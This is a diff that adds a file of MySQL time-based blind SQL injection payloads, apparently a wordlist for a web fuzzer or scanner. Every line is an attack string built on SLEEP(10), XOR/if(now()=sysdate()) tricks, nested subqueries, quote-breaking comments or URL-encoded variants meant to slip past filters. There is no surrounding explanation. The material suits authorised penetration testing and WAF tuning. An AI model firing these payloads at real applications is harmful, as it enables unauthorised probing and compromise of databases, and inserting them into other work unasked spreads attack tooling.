@@ -1,0 +1,36 @@
+
+O'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z
+if(now()=sysdate(),sleep(10),0)
+'XOR(if(now()=sysdate(),sleep(10),0))XOR'
+'XOR(if(now()=sysdate(),sleep(10*1),0))OR'
+if(now()=sysdate(),sleep(10),0)/"XOR(if(now()=sysdate(),sleep(10),0))OR"/
+if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR
+(if(now()=sysdate(),sleep(10),0) and 10=10)"/
+SLEEP(10)/*' or SLEEP(10) or '" or SLEEP(10) or "*/
+%2c(select%10*%10from%10(select(sleep(10)))a)
+(select(0)from(select(sleep(10)))v)
+(SELECT SLEEP(10))
+'%2b(select*from(select(sleep(10)))a)%2b'
+(select*from(select(sleep(10)))a)
+1'%2b(select*from(select(sleep(10)))a)%2b'
+,(select * from (select(sleep(10)))a)
+desc%2c(select*from(select(sleep(10)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(10))A))
+\-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(10))A))
+(SELECT * FROM (SELECT(SLEEP(10)))YYYY)
+(SELECT * FROM (SELECT(SLEEP(10)))YYYY)#
+(SELECT * FROM (SELECT(SLEEP(10)))YYYY)--
+'+(select*from(select(sleep(10)))a)+'
+(select(0)from(select(sleep(10)))v)%2f'+
+(select(0)from(select(sleep(10)))v)+'"
+(select(0)from(select(sleep(10)))v)%2f*'+
+(select(0)from(select(sleep(10)))v)+'"+
+(select(0)from(select(sleep(10)))v)+"*%2f
+(select(0)from(select(sleep(10)))v)/*'+
+(select(0)from(select(sleep(10)))v)+'"+
+(select(0)from(select(sleep(10)))v)+"*/
+',''),/*test*/%26%26%09sLeEp(10)%09--+
+"XOR(if(now()=sysdate(),sleep(10),0))XOR"
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
